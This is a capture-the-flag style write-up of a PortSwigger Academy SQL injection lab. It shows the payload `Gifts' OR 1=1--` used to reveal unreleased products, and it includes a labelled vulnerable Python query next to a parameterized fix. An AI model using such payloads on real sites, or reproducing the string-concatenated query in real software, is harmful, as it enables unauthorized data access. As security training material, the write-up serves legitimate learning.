# SQL Injection - WHERE Clause Attack (Revealing Hidden Data)

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Difficulty:** Apprentice  
**Date:** March 2026

---

## Objective

Display all products in the database, including unreleased items that are normally hidden from users by filtering on the `released = 1` condition.

---

## Vulnerability

The application builds SQL queries using unsanitized user input from the `category` parameter. The vulnerable code likely looks like this on the backend:

```sql
SELECT * FROM products WHERE category = 'USER_INPUT' AND released = 1
```

**Developer Mistake:**  
The application directly concatenates user input into the SQL query without:
- Input validation
- Parameterized queries/prepared statements
- Escaping special characters like single quotes (`'`)

This allows attackers to break out of the intended string context and inject arbitrary SQL conditions.

---

## Steps

1. **Analyzed the URL structure**
   - Normal URL: `https://[LAB-ID].web-security-academy.net/filter?category=Gifts`
   - Identified the `category` parameter as the injection point

2. **Understood the backend query**
   - Realized the app wraps the category value in single quotes
   - The query filters products with `AND released = 1`

3. **Crafted the injection payload**
   - Used `'` to close the string
   - Added `OR 1=1` to make the condition always true
   - Used `--` to comment out the rest of the query

4. **Injected the payload**
   - Modified URL: `/filter?category=Gifts' OR 1=1--`
   - Observed all products displayed, including unreleased ones

5. **Lab solved** ✅

---

## Payload

```sql
Gifts' OR 1=1--
```

**Complete URL:**
```
/filter?category=Gifts' OR 1=1--
```

**Resulting SQL Query:**
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

**What happens:**
- `Gifts'` closes the original string
- `OR 1=1` creates an always-true condition
- `--` comments out `' AND released = 1`, removing the filter
- All products are returned

---

## What I Learned

1. **Single quote (`'`) is the key** to breaking out of SQL string contexts
2. **SQL comments (`--`)** are essential for removing unwanted trailing query parts
3. **`OR 1=1`** forces the WHERE clause to always evaluate to true, bypassing filters
4. Understanding the backend query structure is crucial before crafting payloads
5. Even simple input validation or parameterized queries would have prevented this vulnerability entirely

---

## Mitigation

**For Developers:**
- Use **parameterized queries** (prepared statements) instead of string concatenation
- Implement **input validation** and whitelist allowed category values
- Apply **principle of least privilege** to database user accounts
- Never trust user input — always sanitize and validate

**Example Fix (Python):**
```python
# ❌ Vulnerable
query = f"SELECT * FROM products WHERE category = '{user_input}' AND released = 1"

# ✅ Secure
query = "SELECT * FROM products WHERE category = ? AND released = 1"
cursor.execute(query, (user_input,))
```